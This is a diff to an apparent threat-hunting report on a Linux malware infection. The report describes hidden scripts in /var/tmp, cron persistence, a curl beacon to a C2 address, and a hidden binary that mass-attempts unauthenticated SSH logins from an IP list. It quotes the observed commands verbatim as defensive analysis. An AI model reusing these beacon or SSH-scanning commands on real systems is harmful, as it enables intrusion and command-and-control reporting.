@@ -270,30 +270,78 @@ curl --silent "http://196.251.73.38:47/save-data?IP=103.108.140.172"
 
 #### March 14 - 17 2025 - *Need Title*
 
+March 14
+
 **Device Involved:**
-- `linux-programatic-ajs`
+- `sakel-linux-2`
 
 **Activity:**
-The same `linux-programatic-ajs` device displayed suspsicious activity with a command that silently sends a device's IP address to a remote server (`196.251.73.38:47`) via a crafted HTTP request using `curl`. It disguises the traffic as a legitimate browser request by adding typical headers. The use of --insecure bypasses SSL certificate validation, and the activity likely functions as a beacon — reporting the infected system’s presence back to a command-and-control (C2) server. It used IP `103.108.140.172` as the parameters. As you can see the `Update` file created and executed this curl script.
-
-```kql
-curl --silent "http://196.251.73.38:47/save-data?IP=103.108.140.172" 
-  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
-  -H "Accept-Language: en-US,en;q=0.9" 
-  -H "Cache-Control: max-age=0" 
-  -H "Connection: keep-alive" 
-  -H "Upgrade-Insecure-Requests: 1" 
-  --insecure
-```
+Hidden script `History` was executed which triggered `Update` file to be within the same `.update-logs` directory to be ran. From the `Update` file running, both `.bisis` and `cache` were created. Proceeding was the execution of the `cache` file
 
 <p align="center">  
-  <img src="https://github.com/user-attachments/assets/f780335a-18a6-4043-863c-23c756c3439b" alt="Detailed Process Timeline" width="700"/>
+  <img src="https://github.com/user-attachments/assets/c4f416f2-61a5-4ee8-9302-1fc3f039cf9d" alt="Detailed Process Timeline" width="700"/>
+  <img src="https://github.com/user-attachments/assets/24e63de5-8840-429c-b10c-9f119c1415cc" alt="Detailed Process Timeline" width="700"/>
 </p>
 
+**Additional Activity:**
+`cron` job initiated a background script `.b` that silently runs from the temp directory attempting to avoid detection. the `.b` directly. `cache` file dropped and launched again after the `.b` execution
+
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/1437548a-13c6-4bcd-92ba-fb7275099c7b" alt="Detailed Process Timeline" width="700"/>
+</p>
+
+**More Activity:**
+`Update` file is executed and then there is a curl command that silently sends an HTTP `GET` request to `http://196.251.73.38:47/save-data`, including an IP address (`45.64.186.20`) as a query parameter.
+
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/3c089219-b09e-4c85-a080-a0782ca36cca" width="700"/>
+</p>
+
+March 17
+
+**Activity:**
+`Update` file is silently ran exactly like the `.b` file from activity that occurred on the 14th
+
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/6756dbbe-9f5d-4b97-9475-cc4cf4850e6c" width="700"/>
+</p>
+
+**Following Activity:**
+Bash command runs and a hidden executable `.bisis` that takes a list of IPs and tries to connect to them via SSH without authentication, using settings from a config file (`data.json`). It also increases system limits to handle many simultaneous connections and then runs another script (`x`) afterward.
+
+```kql
+bash -c "
+cd /var/tmp/.update-logs
+chmod +x /var/tmp/.update-logs/.bisis
+ulimit -n 999999
+cat /var/tmp/.update-logs/iplist | /var/tmp/.update-logs/./.bisis ssh -o /var/tmp/.update-logs/data.json --userauth none --timeout 8
+/var/tmp/.update-logs/x
+"
+```
+
+```kql
+/var/tmp/.update-logs/./.bisis ssh \
+  -o /var/tmp/.update-logs/data.json \
+  --userauth none \
+  --timeout 8
+```
+
+
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/116d0f50-47d0-419d-a6f6-d110963ebca0" width="700"/>
+</p>
+
+
+
+
+
 **VirusTotal Scores:**
-- `Update`: ****
+- `History`: ****
+- `Update`: **N/A**
+- `.bisis`: **N/A**
+- `cache`: **N/A**
+- `.b`: **N/A**
 - `196.251.73.38:47`: **N/A**
-- `103.108.140.172`: **N/A**
 
 
 
